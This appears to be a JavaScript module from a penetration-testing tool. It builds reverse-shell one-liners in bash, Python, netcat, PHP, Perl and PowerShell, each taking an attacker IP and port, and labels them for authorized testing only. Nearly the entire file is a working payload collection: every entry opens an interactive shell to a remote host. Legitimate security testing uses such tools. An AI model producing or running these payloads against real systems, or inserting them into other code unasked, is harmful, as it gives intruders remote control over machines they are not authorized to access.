"use strict";
// Reverse-shell one-liner payloads, keyed by language. Pure string builders — no
// I/O, no coloring — so they are unit-tested for exact output (payload correctness
// is security-critical). Extracted from sentinel.js. For authorized testing only.
const SHELLS = {
  bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
  python3: (i, o) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${o}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,
  nc: (i, o) => `nc -e /bin/sh ${i} ${o}`,
  "nc-mkfifo": (i, o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${o} >/tmp/f`,
  php: (i, o) => `php -r '$s=fsockopen("${i}",${o});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  perl: (i, o) => `perl -e 'use Socket;$i="${i}";$p=${o};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
  powershell: (i, o) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${o});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($k=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$k);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
};

// revshell(lang, ip, port) -> the one-liner. Unknown lang falls back to bash,
// matching the historical CLI/menu behavior.
function revshell(lang, ip, port) { return (SHELLS[lang] || SHELLS.bash)(ip, port); }
function shellLangs() { return Object.keys(SHELLS); }
module.exports = { SHELLS, revshell, shellLangs };
